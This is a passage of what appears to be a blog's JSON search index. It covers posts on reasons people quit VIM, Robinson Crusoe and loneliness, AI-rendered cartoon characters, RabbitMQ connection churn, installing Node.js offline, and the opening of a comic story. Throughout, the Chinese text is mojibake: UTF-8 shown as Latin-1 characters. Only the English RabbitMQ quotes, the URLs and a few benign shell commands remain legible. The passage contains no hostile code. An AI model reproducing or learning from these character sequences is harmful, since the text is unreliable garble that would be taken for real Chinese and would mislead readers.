ç™¾è¡Œäº†ï¼Œä¸‡ä¸€sshè¿œç¨‹è¿æ¥æ–­äº†ï¼Œæˆ–è€…è¯´ç»ˆç«¯å´©æºƒäº†ï¼Œæˆ‘å†™çš„æ–‡ä»¶ä¼šä¸ä¼šä¸¢å‘¢ï¼Ÿä¸ºäº†å®‰å…¨èµ·è§ï¼Œè¿˜æ˜¯ä¸ç”¨VIMå§ã€‚\næŒ«æŠ˜æ„Ÿ ä½¿ç”¨VIMçš„æ—¶å€™ï¼Œä½ å¿…ç„¶è¦ç»å†è¿‡å¾ˆå¤šå›°éš¾ï¼Œè¿™äº›å›°éš¾è®©ä½ æ„Ÿè§‰åˆ°æŒ«æŠ˜ï¼Œå¤±å»äº†ç»§ç»­å­¦ä¹ çš„æ¬²æœ›ã€‚å†…å¿ƒçš„å¦å¤–ä¸€ä¸ªäººå¯èƒ½ä¼šè¯´ï¼Œæˆ‘åªæƒ³å®‰å®‰é™é™åœ°åšä¸€ä¸ªå†™ä»£ç çš„ç¾ç”·å­ï¼Œä¸ºä»€ä¹ˆè¦æŠ˜è…¾è¿™æ¯«æ— é¢œå€¼ã€éš¾ç”¨çš„VIMå‘¢ï¼Ÿ\n","permalink":"https://wdd.js.org/vim/why-you-leave-vim/","summary":"æˆ‘åªä½¿ç”¨VIMä½œä¸ºä¸»åŠ›å¼€å‘å·¥å…·ï¼Œå·²ç»å¿«åˆ°200å¤©äº†ã€‚èŠèŠè¿™å…¶ä¸­çš„ä¸€äº›æ„Ÿå—ã€‚\nå¯¹å¤§éƒ¨åˆ†æ¥è¯´ï¼Œæåˆ°æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šæƒ³åˆ°word, nodepad++, webstorm, sublime, vscodeã€‚\nè¿™äº›GUIå·¥å…·åœ¨ç»™æˆ‘ä»¬æä¾›ä¾¿åˆ©æ€§çš„åŒæ—¶ï¼Œä¹Ÿåœ¨é€æ¸å›ºåŒ–æˆ‘ä»¬å¯¹äºç¼–è¾‘å™¨çš„è®¤çŸ¥ä¸æ€ç»´æ–¹å¼ã€‚\né—­ä¸Šçœ¼ç›ï¼Œæåˆ°ç¼–è¾‘å™¨ï¼Œä½ è„‘æµ·é‡Œæƒ³åˆ°çš„ç•Œé¢æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ\nå·¦è¾¹ä¸€ä¸ªæ–‡ä»¶æµè§ˆçª—å£ å³è¾¹ä¸€ä¸ªå¤šæ ‡ç­¾é¡µçš„æ–‡ä»¶ç¼–è¾‘çª—å£ é™Œç”Ÿæ„Ÿ æƒ³è±¡ä¸€ä¸‹ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ç¼–è¾‘å™¨çš„æ—¶å€™ï¼Œå“ªäº›åŠ¨ä½œåšçš„æœ€å¤š\né¼ æ ‡ç§»åŠ¨åˆ°æ–‡ä»¶æµè§ˆçª—å£ï¼Œé€šè¿‡æ»šè½®çš„æ»šåŠ¨ï¼Œæ¥é€‰æ‹©æ–‡ä»¶ï¼Œå•å‡»ä¹‹åï¼Œæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ã€‚ä½†æ˜¯åœ¨VIMä¸Šï¼Œå®Œå…¨æ²¡æœ‰è¿™ç§æ“ä½œã€‚ GUIä¸‹å¯ä»¥åŒæ—¶æ‰“å¼€å¤šä¸ªæ–‡ä»¶ï¼Œè¿›è¡Œç¼–è¾‘ã€‚ä½†æ˜¯å¾ˆå¤šäººè§‰å¾—VIMåªèƒ½æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œç”šè‡³æƒ³æ‰“å¼€å¦ä¸€ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œå…ˆè¦é€€å‡ºVIMã€‚å³ä½¿æ‰“å¼€äº†å¤šä¸ªæ–‡ä»¶ï¼Œä¹Ÿä¸çŸ¥é“è¿™äº›æ–‡ä»¶è¦å¦‚ä½•åˆ‡æ¢ã€‚ ä½†æ˜¯å½“ä½ åˆšå¼€å§‹ä½¿ç”¨VIMçš„æ—¶å€™ï¼Œå¯èƒ½å¹¶æ²¡æœ‰å®‰è£…ä»€ä¹ˆæ’ä»¶ï¼Œè¿™æ—¶å€™ä½ ä¼šæœ‰ä»¥ä¸‹çš„ä¸€äº›å›°æƒ‘\nä½ ç”¨VIMæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åï¼Œæ€ä¹ˆå†æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å‘¢ï¼Ÿå› ä¸ºé»˜è®¤çš„VIMæ˜¯æ²¡æœ‰æ–‡ä»¶æµè§ˆçª—å£çš„ã€‚ä½ åœ¨GUIæ¨¡å¼ä¸‹å…»æˆçš„ç»éªŒï¼Œåœ¨VIMä¸Šå®Œå…¨æ— æ³•ä½¿ç”¨ã€‚ä½ å¯èƒ½ç”šè‡³ä¸çŸ¥é“è¦æ€ä¹ˆé€€å‡ºVIMã€‚æ‰€æœ‰çš„ä¸€åˆ‡éƒ½é‚£ä¹ˆé™Œç”Ÿã€‚\nè™šæ— æ„Ÿ VIMä¸€èˆ¬éƒ½è¿è¡Œåœ¨ç»ˆç«¯ä¹‹ä¸Šï¼Œç»™äººæ„Ÿè§‰äº‘é‡Œé›¾é‡Œï¼Œè™šæ— ç¼¥ç¼ˆã€‚è€Œç¼–è¾‘å™¨å°±ä¸åŒäº†ï¼Œä½ çœ‹åˆ°çš„æ–‡ä»¶å¤¹ï¼Œæ‰“å¼€çš„æ–‡ä»¶ï¼Œå¯¹ä½ æ¥è¯´å°±åƒæ˜¯èº«ä¸Šç©¿çš„è¡£æœï¼Œæ‰‹é‡Œæ¬çš„ç –ã€‚ç»ˆç«¯å‘¢ï¼Œé»‘ä¹ä¹çš„ï¼Œæ²¡å•¥é¢œè‰²ä¸å›¾æ ‡ï¼Œçœ‹èµ·æ¥é‚£ä¹ˆä¸åˆ‡å®é™…ï¼Œä»¿ä½›æ˜¯å¤©è¾¹çš„äº‘å½©ï¼Œåƒå˜ä¸‡åŒ–ï¼Œæ— æ³•ç¢ç£¨ã€‚\nææƒ§æ„Ÿ å¾ˆå¤šäººå¯èƒ½åšè¿‡é‚£ç§æ¢¦ï¼Œå°±æ˜¯åœ¨æ¢¦é‡Œæ„Ÿè§‰è‡ªå·±åœ¨è‡ªç”±è½ä½“ï¼Œç„¶åæƒŠé†’ã€‚åœ¨ä½ ä½¿ç”¨VIMçš„æ—¶å€™ï¼Œå¯èƒ½ä¹Ÿä¼šæœ‰è¿™ç§æ„Ÿè§‰ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªæ–‡ä»¶æˆ‘å†™äº†å‡ ç™¾è¡Œäº†ï¼Œä¸‡ä¸€sshè¿œç¨‹è¿æ¥æ–­äº†ï¼Œæˆ–è€…è¯´ç»ˆç«¯å´©æºƒäº†ï¼Œæˆ‘å†™çš„æ–‡ä»¶ä¼šä¸ä¼šä¸¢å‘¢ï¼Ÿä¸ºäº†å®‰å…¨èµ·è§ï¼Œè¿˜æ˜¯ä¸ç”¨VIMå§ã€‚\næŒ«æŠ˜æ„Ÿ ä½¿ç”¨VIMçš„æ—¶å€™ï¼Œä½ å¿…ç„¶è¦ç»å†è¿‡å¾ˆå¤šå›°éš¾ï¼Œè¿™äº›å›°éš¾è®©ä½ æ„Ÿè§‰åˆ°æŒ«æŠ˜ï¼Œå¤±å»äº†ç»§ç»­å­¦ä¹ çš„æ¬²æœ›ã€‚å†…å¿ƒçš„å¦å¤–ä¸€ä¸ªäººå¯èƒ½ä¼šè¯´ï¼Œæˆ‘åªæƒ³å®‰å®‰é™é™åœ°åšä¸€ä¸ªå†™ä»£ç çš„ç¾ç”·å­ï¼Œä¸ºä»€ä¹ˆè¦æŠ˜è…¾è¿™æ¯«æ— é¢œå€¼ã€éš¾ç”¨çš„VIMå‘¢ï¼Ÿ","title":"è®©ä½ æ”¾å¼ƒVIMçš„ä¸€äº›åŸå› "},{"content":"åˆä¸­çš„æ—¶å€™ï¼Œæˆ‘æ›¾ç»è¯»è¿‡é²æ»¨é€Šæ¼‚æµè®°ï¼Œé‚£æ—¶å€™è¿™æœ¬ä¹¦ä¸­æœ€å¸å¼•æˆ‘çš„æ˜¯å„ç§æ–°å¥‡çš„å†’é™©ä½“éªŒï¼Œé²æ»¨é€Šæ¥ä¸‹æ¥ä¼šé‡åˆ°ä»€ä¹ˆäº‹æƒ…ï¼Œæ˜¯æˆ‘æœ€å…³æ³¨çš„äº‹æƒ…ã€‚\næœ€è¿‘ï¼Œæˆ‘åˆå¼€å§‹è¯»è¿™æœ¬ä¹¦äº†ã€‚æ˜¯å› ä¸ºæˆ‘æ„Ÿè§‰åˆ°å¾ˆå­¤ç‹¬ï¼Œæˆ‘ä¸çŸ¥é“å¦‚ä½•è§£å†³ã€‚æˆ‘æƒ³ï¼Œé²æ»¨é€Šä¸€ä¸ªäººåœ¨ä¸€ä¸ªè’å²›ä¸Šè¿‡äº†äºŒåå…«å¹´ï¼Œä»–æ˜¯å¦‚ä½•é¢å¯¹å­¤ç‹¬çš„å‘¢ï¼Ÿæˆ‘æƒ³æ‰¾åˆ°è¿™ä¸ªç­”æ¡ˆã€‚\nå†™æ—¥è®° å°è¯´ä¸­æœ‰ä¸å°‘çš„ç« èŠ‚ï¼Œéƒ½æ˜¯é²æ»¨é€Šçš„æ—¥è®°ã€‚è®°å½•äº†ä»–æ¯å¤©çš„å·¥ä½œå’Œç»å†ï¼Œé€šè¿‡å†™æ—¥å¿—ï¼Œä»–ä»¿ä½›èƒ½å¤Ÿä¸è‡ªå·±å¯¹è¯ã€‚æ‰€ä»¥ï¼Œæœ‰æ—¶å€™å½“æˆ‘æ„Ÿåˆ°å­¤ç‹¬çš„æ—¶å€™ï¼Œæˆ‘ä¹Ÿå†™æ—¥è®°ï¼ŒæŠŠæˆ‘çš„æ„Ÿæƒ³ï¼Œæˆ‘çš„å›°æƒ‘å’Œçƒ¦æ¼ç»Ÿç»Ÿå†™å‡ºæ¥ã€‚å¯¹æˆ‘è‡ªå·±æ¥è¯´ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ç§é‡Šæ”¾ã€‚\næŠ•èº«å·¥ä½œï¼Œåˆ¶é€ äº§å“ï¼Œè®©è‡ªå·±å¿™æ´» é™¤éç”Ÿç—…æˆ–è€…ä¸‹é›¨ï¼Œé²å…µé€Šæ€»æ˜¯åœ¨ä¸åœçš„å¿™æ´»ç€ã€‚\næ”¶é›†è‘¡è„ï¼Œæ™’è‘¡è„å¹² åœˆå…»å°ç¾Šï¼Œè®©è‡ªå·±æœ‰å……è¶³çš„è‚‰å¯ä»¥åƒ ç§æ¤å¤§éº¦ï¼Œè‡ªå·±åˆ¶ä½œé¢åŒ… åŠ å›ºè‡ªå·±çš„æˆ¿å­ æ™’åˆ¶é™¶åœŸï¼Œåˆ¶ä½œé™¶å™¨ ç¯å²›æ—…è¡Œ \u0026hellip; é²æ»¨é€Šæ¯å¤©éƒ½åœ¨å¿™æ´»ç€ï¼Œæ¯ä¸€å¤©è¿‡å¾—éƒ½éå¸¸æœ‰æ„ä¹‰ã€‚æˆ‘ä¹Ÿè§‰å¾—è‡ªå·±å†³ä¸èƒ½æµªè´¹æ—¶é—´ã€‚\næ‰¾åˆ°è‡ªå·±çš„ä¿¡ä»° é²æ»¨é€Šåœ¨ä¸€æ¬¡ç”Ÿç—…è¿‡ç¨‹ä¸­ï¼Œèº«ä½“éå¸¸è™šå¼±ï¼Œå½“ä»–å›å¿†å¾€äº‹çš„æ—¶å€™ï¼Œæ€»è§‰å¾—è‡ªå·±æ˜¯ä¸ªç½ªæ¶çš„äººï¼Œæ— æ³•å¾—åˆ°è°…è§£ã€‚ä½†æ˜¯å¶ç„¶ä»–å¾—åˆ°ä¸€æœ¬ã€Šåœ£ç»ã€‹ï¼Œä»–é˜…è¯»åœ£ç»ï¼Œä»ä¸­æ‰¾åˆ°è‡ªå·±çš„ä¿¡ä»°ã€‚æœ‰ä¿¡ä»°æ˜¯éå¸¸å¹¸ç¦çš„äº‹æƒ…ï¼Œä½†æ˜¯ä½ è‹¥é—®æˆ‘æˆ‘çš„ä¿¡ä»°æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘çš„ä¿¡ä»°æ˜¯ä»€ä¹ˆã€‚\nè¿™æ˜¯æœ€å¥½çš„æ—¶ä»£ï¼Œä¹Ÿæ˜¯æœ€åçš„æ—¶ä»£ã€‚æ‰€æœ‰çš„äººéƒ½è§‰å¾—90åæ˜¯å‹åŠ›æœ€å¤§çš„ä¸€ä»£ï¼Œ90éƒ½ç¥ç»ä¹Ÿæ˜¯æœ€æ•æ„Ÿçš„ï¼ˆè…¾è®¯å¼ å†›çš„è‡´æ•¬é’å¹´ï¼Œç™½å²©æ¾çš„â€œä¸ä¼šå§â€ï¼‰ã€‚æˆ‘ä»¬æ‰¿å—ç€å„ç§å‹åŠ›ï¼Œå…¶ä¸­æœ€å¤§çš„å¯èƒ½å°±æ˜¯æˆ¿ä»·äº†ã€‚\näººç”Ÿå½“ä¸­ï¼Œè‡ªç”±è‡ªåœ¨å¯èƒ½ä»…ä»…æ˜¯ç‰‡åˆ»çš„ï¼Œæ‰¿å—å‹åŠ›å´æ˜¯ä¸»æ—‹å¾‹ã€‚ä½†æ˜¯å¦‚ä½•é¢å¯¹å‹åŠ›ï¼Œå´æŠŠäººåˆ†æˆäº†ä¸åŒçš„æ ·å­ã€‚æœ‰çš„äººä¼šè¢«å‹åŠ›å‡»å®ï¼Œæ”¾å¼ƒæŠµæŠ—ï¼Œæ²‰é†‰äºå„ç§ç½‘ç»œç²¾ç¥é¸¦ç‰‡ä¸­ï¼Œæœ‰çš„äººå´èƒ½è´Ÿé‡å‰è¡Œï¼ŒåšæŒå­¦ä¹ ï¼Œä¸€å¾€æ— å‰ã€‚\nç½—æ›¼ç½—å…°è¯´è¿‡ï¼šè¿™ä¸–ä¸Šåªæœ‰ä¸€ç§çœŸæ­£çš„è‹±é›„ä¸»ä¹‰ï¼Œå°±æ˜¯è®¤æ¸…ç”Ÿæ´»çš„çœŸç›¸ï¼Œå¹¶ä¸”ä»»ç„¶çƒ­çˆ±å¥¹ã€‚\n","permalink":"https://wdd.js.org/posts/2021/05/vzfo04/","summary":"åˆä¸­çš„æ—¶å€™ï¼Œæˆ‘æ›¾ç»è¯»è¿‡é²æ»¨é€Šæ¼‚æµè®°ï¼Œé‚£æ—¶å€™è¿™æœ¬ä¹¦ä¸­æœ€å¸å¼•æˆ‘çš„æ˜¯å„ç§æ–°å¥‡çš„å†’é™©ä½“éªŒï¼Œé²æ»¨é€Šæ¥ä¸‹æ¥ä¼šé‡åˆ°ä»€ä¹ˆäº‹æƒ…ï¼Œæ˜¯æˆ‘æœ€å…³æ³¨çš„äº‹æƒ…ã€‚\næœ€è¿‘ï¼Œæˆ‘åˆå¼€å§‹è¯»è¿™æœ¬ä¹¦äº†ã€‚æ˜¯å› ä¸ºæˆ‘æ„Ÿè§‰åˆ°å¾ˆå­¤ç‹¬ï¼Œæˆ‘ä¸çŸ¥é“å¦‚ä½•è§£å†³ã€‚æˆ‘æƒ³ï¼Œé²æ»¨é€Šä¸€ä¸ªäººåœ¨ä¸€ä¸ªè’å²›ä¸Šè¿‡äº†äºŒåå…«å¹´ï¼Œä»–æ˜¯å¦‚ä½•é¢å¯¹å­¤ç‹¬çš„å‘¢ï¼Ÿæˆ‘æƒ³æ‰¾åˆ°è¿™ä¸ªç­”æ¡ˆã€‚\nå†™æ—¥è®° å°è¯´ä¸­æœ‰ä¸å°‘çš„ç« èŠ‚ï¼Œéƒ½æ˜¯é²æ»¨é€Šçš„æ—¥è®°ã€‚è®°å½•äº†ä»–æ¯å¤©çš„å·¥ä½œå’Œç»å†ï¼Œé€šè¿‡å†™æ—¥å¿—ï¼Œä»–ä»¿ä½›èƒ½å¤Ÿä¸è‡ªå·±å¯¹è¯ã€‚æ‰€ä»¥ï¼Œæœ‰æ—¶å€™å½“æˆ‘æ„Ÿåˆ°å­¤ç‹¬çš„æ—¶å€™ï¼Œæˆ‘ä¹Ÿå†™æ—¥è®°ï¼ŒæŠŠæˆ‘çš„æ„Ÿæƒ³ï¼Œæˆ‘çš„å›°æƒ‘å’Œçƒ¦æ¼ç»Ÿç»Ÿå†™å‡ºæ¥ã€‚å¯¹æˆ‘è‡ªå·±æ¥è¯´ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ç§é‡Šæ”¾ã€‚\næŠ•èº«å·¥ä½œï¼Œåˆ¶é€ äº§å“ï¼Œè®©è‡ªå·±å¿™æ´» é™¤éç”Ÿç—…æˆ–è€…ä¸‹é›¨ï¼Œé²å…µé€Šæ€»æ˜¯åœ¨ä¸åœçš„å¿™æ´»ç€ã€‚\næ”¶é›†è‘¡è„ï¼Œæ™’è‘¡è„å¹² åœˆå…»å°ç¾Šï¼Œè®©è‡ªå·±æœ‰å……è¶³çš„è‚‰å¯ä»¥åƒ ç§æ¤å¤§éº¦ï¼Œè‡ªå·±åˆ¶ä½œé¢åŒ… åŠ å›ºè‡ªå·±çš„æˆ¿å­ æ™’åˆ¶é™¶åœŸï¼Œåˆ¶ä½œé™¶å™¨ ç¯å²›æ—…è¡Œ \u0026hellip; é²æ»¨é€Šæ¯å¤©éƒ½åœ¨å¿™æ´»ç€ï¼Œæ¯ä¸€å¤©è¿‡å¾—éƒ½éå¸¸æœ‰æ„ä¹‰ã€‚æˆ‘ä¹Ÿè§‰å¾—è‡ªå·±å†³ä¸èƒ½æµªè´¹æ—¶é—´ã€‚\næ‰¾åˆ°è‡ªå·±çš„ä¿¡ä»° é²æ»¨é€Šåœ¨ä¸€æ¬¡ç”Ÿç—…è¿‡ç¨‹ä¸­ï¼Œèº«ä½“éå¸¸è™šå¼±ï¼Œå½“ä»–å›å¿†å¾€äº‹çš„æ—¶å€™ï¼Œæ€»è§‰å¾—è‡ªå·±æ˜¯ä¸ªç½ªæ¶çš„äººï¼Œæ— æ³•å¾—åˆ°è°…è§£ã€‚ä½†æ˜¯å¶ç„¶ä»–å¾—åˆ°ä¸€æœ¬ã€Šåœ£ç»ã€‹ï¼Œä»–é˜…è¯»åœ£ç»ï¼Œä»ä¸­æ‰¾åˆ°è‡ªå·±çš„ä¿¡ä»°ã€‚æœ‰ä¿¡ä»°æ˜¯éå¸¸å¹¸ç¦çš„äº‹æƒ…ï¼Œä½†æ˜¯ä½ è‹¥é—®æˆ‘æˆ‘çš„ä¿¡ä»°æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘çš„ä¿¡ä»°æ˜¯ä»€ä¹ˆã€‚\nè¿™æ˜¯æœ€å¥½çš„æ—¶ä»£ï¼Œä¹Ÿæ˜¯æœ€åçš„æ—¶ä»£ã€‚æ‰€æœ‰çš„äººéƒ½è§‰å¾—90åæ˜¯å‹åŠ›æœ€å¤§çš„ä¸€ä»£ï¼Œ90éƒ½ç¥ç»ä¹Ÿæ˜¯æœ€æ•æ„Ÿçš„ï¼ˆè…¾è®¯å¼ å†›çš„è‡´æ•¬é’å¹´ï¼Œç™½å²©æ¾çš„â€œä¸ä¼šå§â€ï¼‰ã€‚æˆ‘ä»¬æ‰¿å—ç€å„ç§å‹åŠ›ï¼Œå…¶ä¸­æœ€å¤§çš„å¯èƒ½å°±æ˜¯æˆ¿ä»·äº†ã€‚\näººç”Ÿå½“ä¸­ï¼Œè‡ªç”±è‡ªåœ¨å¯èƒ½ä»…ä»…æ˜¯ç‰‡åˆ»çš„ï¼Œæ‰¿å—å‹åŠ›å´æ˜¯ä¸»æ—‹å¾‹ã€‚ä½†æ˜¯å¦‚ä½•é¢å¯¹å‹åŠ›ï¼Œå´æŠŠäººåˆ†æˆäº†ä¸åŒçš„æ ·å­ã€‚æœ‰çš„äººä¼šè¢«å‹åŠ›å‡»å®ï¼Œæ”¾å¼ƒæŠµæŠ—ï¼Œæ²‰é†‰äºå„ç§ç½‘ç»œç²¾ç¥é¸¦ç‰‡ä¸­ï¼Œæœ‰çš„äººå´èƒ½è´Ÿé‡å‰è¡Œï¼ŒåšæŒå­¦ä¹ ï¼Œä¸€å¾€æ— å‰ã€‚\nç½—æ›¼ç½—å…°è¯´è¿‡ï¼šè¿™ä¸–ä¸Šåªæœ‰ä¸€ç§çœŸæ­£çš„è‹±é›„ä¸»ä¹‰ï¼Œå°±æ˜¯è®¤æ¸…ç”Ÿæ´»çš„çœŸç›¸ï¼Œå¹¶ä¸”ä»»ç„¶çƒ­çˆ±å¥¹ã€‚","title":"å†è¯»é²æ»¨é€Šæ¼‚æµè®°: æˆå¹´äººå¦‚ä½•é¢å¯¹å­¤ç‹¬"},{"content":"é­”å¥³å®…æ€¥ä¾¿ çªçª æœ‰ç‚¹åƒèŠ±æœ¨å…° ä½åŠ© ä¸è®¤è¯† å°æ¨± ä¸è®¤è¯† ä¸è®¤è¯† ä¸è®¤è¯† å‚è€ƒ https://designyoutrust.com/2021/04/person-uses-artificial-intelligence-to-make-anime-and-cartoon-characters-look-more-realistic/ ","permalink":"https://wdd.js.org/posts/2021/05/mfh46t/","summary":"é­”å¥³å®…æ€¥ä¾¿ çªçª æœ‰ç‚¹åƒèŠ±æœ¨å…° ä½åŠ© ä¸è®¤è¯† å°æ¨± ä¸è®¤è¯† ä¸è®¤è¯† ä¸è®¤è¯† å‚è€ƒ https://designyoutrust.com/2021/04/person-uses-artificial-intelligence-to-make-anime-and-cartoon-characters-look-more-realistic/ ","title":"ä½¿ç”¨AIè®©å¡é€šäººç‰©æ›´åŠ çœŸå®"},{"content":"è¿æ¥æŠ–åŠ¨ä»‹ç» Workloads with high connection churn (a high rate of connections being opened and closed) will require TCP setting tuning to avoid exhaustion of certain resources: max number of file handles, Erlang processes on RabbitMQ nodes, kernel\u0026rsquo;s ephemeral port range (for hosts that open a lot of connections, including Federation links and Shovel connections), and others. Nodes that are exhausted of those resources won\u0026rsquo;t be able to accept new connections, which will negatively affect overall system availability.\nè¿æ¥æŠ–åŠ¨ï¼Œå°±æ˜¯åœ¨å•ä½æ—¶é—´å†…ï¼Œæœ‰å¤§é‡çš„è¿æ¥äº§ç”Ÿï¼Œä¹ŸåŒæ—¶æœ‰å¤§é‡çš„è¿æ¥å…³é—­ã€‚è¿™äº›æŠ–åŠ¨å°†ä¼šè€—è´¹å¤§é‡çš„èµ„æºã€‚\nä»RabbitMq 3.7.9å¼€å§‹ï¼Œå¼•å…¥äº†å¯¹æŠ–åŠ¨æ•°æ®çš„ç»Ÿè®¡ã€‚åœ¨mqç®¡ç†ç•Œé¢ä¸Šï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢çš„å›¾æ ‡ã€‚\nä¸‹é¢æ˜¯éšæ—¶é—´å˜åŒ–ï¼Œmqè¿æ¥æ•°çš„æŠ–åŠ¨æƒ…å†µã€‚\nWhile connection and disconnection rates are system-specific, rates consistently above 100/second likely indicate a suboptimal connection management approach by one or more applications and usually are worth investigating.\nå¦‚æœæŠ–åŠ¨çš„æŒ‡æ ‡æŒç»­çš„è¶…è¿‡æ¯ç§’100ä¸ªï¼Œè¿™å°±éœ€è¦å¼•èµ·æ³¨æ„äº†ï¼Œéœ€è¦è°ƒæŸ¥ä¸‹å…·ä½“çš„æŠ–åŠ¨åŸå› ã€‚\næŠ–åŠ¨ç»Ÿè®¡ æŠ–åŠ¨ç»Ÿè®¡åŒ…æ‹¬ä¸‰ä¸ªæ–¹é¢\nConnection Channel Queue å‚è€ƒ https://www.rabbitmq.com/connections.html#high-connection-churn https://www.rabbitmq.com/networking.html#dealing-with-high-connection-churn https://vincent.bernat.ch/en/blog/2014-tcp-time-wait-state-linux https://www.rabbitmq.com/troubleshooting-networking.html#detecting-high-connection-churn ","permalink":"https://wdd.js.org/posts/2021/05/nr1shd/","summary":"è¿æ¥æŠ–åŠ¨ä»‹ç» Workloads with high connection churn (a high rate of connections being opened and closed) will require TCP setting tuning to avoid exhaustion of certain resources: max number of file handles, Erlang processes on RabbitMQ nodes, kernel\u0026rsquo;s ephemeral port range (for hosts that open a lot of connections, including Federation links and Shovel connections), and others. Nodes that are exhausted of those resources won\u0026rsquo;t be able to accept new connections, which will negatively affect overall system availability.","title":"RabbitMq å¤§é‡çš„è¿æ¥æŠ–åŠ¨"},{"content":"1. é€‰æ‹©å®‰è£…åŒ… è®¿é—® https://nodejs.org/en/download/ é€‰æ‹©Linux Binaries(x64) 2. è§£å‹ ä¸‹è½½åçš„æ–‡ä»¶æ˜¯ä¸€ä¸ªtar.xzçš„æ–‡ä»¶ã€‚\nxz -d node-xxxx.tar.zx // è§£å‹xz tar -xvf node-xxxx.tar // æ‹¿å‡ºæ–‡ä»¶å¤¹ è§£å‹åçš„ç›®å½•å¦‚ä¸‹ï¼Œå…¶ä¸­\nâœ node-v14.17.0-linux-x64 ll total 600K drwxr-xr-x 2 wangdd staff 4.0K May 13 09:34 bin -rw-r--r-- 1 wangdd staff 469K May 12 02:14 CHANGELOG.md drwxr-xr-x 3 wangdd staff 4.0K May 13 09:34 include drwxr-xr-x 3 wangdd staff 4.0K May 13 09:34 lib -rw-r--r-- 1 wangdd staff 79K May 12 02:14 LICENSE -rw-r--r-- 1 wangdd staff 30K May 12 02:14 README.md drwxr-xr-x 5 wangdd staff 4.0K May 12 02:14 share // binç›®å½•ä¸‹å°±æ˜¯nodejsçš„å¯æ‰§è¡Œç¨‹åº âœ node-v14.17.0-linux-x64 ll bin total 71M -rwxr-xr-x 1 wangdd staff 71M May 12 02:14 node lrwxrwxrwx 1 wangdd staff 38 May 12 02:14 npm -\u0026gt; ../lib/node_modules/npm/bin/npm-cli.js lrwxrwxrwx 1 wangdd staff 38 May 12 02:14 npx -\u0026gt; ../lib/node_modules/npm/bin/npx-cli.js âœ node-v14.17.0-linux-x64 ./bin/node --version v14.17.0 é€šè¿‡å°†binç›®å½•åŠ å…¥åˆ°$PATHç¯å¢ƒå˜é‡ä¸­è¿™ç§æ–¹å¼ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨nodeã€‚\n","permalink":"https://wdd.js.org/fe/install-nodejs-offline/","summary":"1. é€‰æ‹©å®‰è£…åŒ… è®¿é—® https://nodejs.org/en/download/ é€‰æ‹©Linux Binaries(x64) 2. è§£å‹ ä¸‹è½½åçš„æ–‡ä»¶æ˜¯ä¸€ä¸ªtar.xzçš„æ–‡ä»¶ã€‚\nxz -d node-xxxx.tar.zx // è§£å‹xz tar -xvf node-xxxx.tar // æ‹¿å‡ºæ–‡ä»¶å¤¹ è§£å‹åçš„ç›®å½•å¦‚ä¸‹ï¼Œå…¶ä¸­\nâœ node-v14.17.0-linux-x64 ll total 600K drwxr-xr-x 2 wangdd staff 4.0K May 13 09:34 bin -rw-r--r-- 1 wangdd staff 469K May 12 02:14 CHANGELOG.md drwxr-xr-x 3 wangdd staff 4.0K May 13 09:34 include drwxr-xr-x 3 wangdd staff 4.0K May 13 09:34 lib -rw-r--r-- 1 wangdd staff 79K May 12 02:14 LICENSE -rw-r--r-- 1 wangdd staff 30K May 12 02:14 README.","title":"ç¦»çº¿å®‰è£…nodejs"},{"content":"ã€æˆ‘åªä¼šå¿ƒç–¼å“¥å“¥ï¼ˆåŸè§†é¢‘ï¼‰-å“”å“©å“”å“©ã€‘https://b23.tv/9YIMtp\nè“å¤©ç™½äº‘ï¼Œæ™´ç©ºä¸‡é‡Œã€‚è·¯æ—çš„ç”µçº¿æ†ç¬”æŒºçš„ç«™ç€ï¼Œæœ‰å‡ åªå°é¸Ÿï¼Œåœ¨ç”µçº¿ä¸Šè¹¦æ¥è¹¦å»ï¼Œå«ç€é—¹ç€ï¼Œç©ºæ°”ä¸­å……äº†ä»¤äººæ„‰å¿«çš„æ„Ÿè§‰ã€‚\nä¸€è¾†ç™½è‰²é›…è¿ªå† èƒ½T5çŸ³å¢¨çƒ¯72ç”µæ± å¢ç¨‹çŸ©é˜µå¼å¤§ç¯è½»ä¾¿å‹ç”µåŠ¨è½¦è‡ªåŒ—å‘å—ï¼Œç–¾é©°è€Œè¿‡ã€‚\nè½¦ä¸Šåç€ä¸€ç”·ä¸€å¥³ã€‚å°‘å¥³æ‰ç€é©¬å°¾è¾«ï¼Œæ‰‹ä¸­ä¸¾ç€ä¸€æ ¹æŠ˜å å¼æ£’æ£’ç³–ï¼Œç¬‘é¥å¦‚ç”»ï¼Œå–ƒå–ƒé“ï¼šâ€œå“¥å“¥ï¼Œå“¥å“¥ï¼Œä½ ç»™æˆ‘ä¹°è¿™ä¸ªï¼Œä½ å¥³æœ‹å‹çŸ¥é“äº†ï¼Œä¸ä¼šç”Ÿæ°”å§ï¼Ÿâ€ ä¸ç­‰ç”·ç”Ÿå›ç­”ï¼Œå¥¹è‡ªé¡¾è‡ªçš„å…ˆå°äº†ä¸€å£ã€‚ç„¶åæŠŠæ£’æ£’ç³–ä¸¾åˆ°ç”·ç”Ÿå˜´è¾¹ï¼Œç„¶åå˜»å˜»ç¬‘é“ï¼šâ€œçœŸå¥½åƒï¼Œå“¥ï¼Œä½ ä¹Ÿå°ä¸€å£â€\næ²¡æœ‰ä¸€ä¸ªäººç§è§è¿™ç”·ç”Ÿæ˜¯æ€ä¹ˆèˆ”åˆ°æ£’æ£’ç³–çš„ï¼Œä½†ä»–çš„ç¡®å°äº†ä¸€å£ã€‚\nå°‘å¥³çå¤§çœ¼ç›ï¼Œå¼ 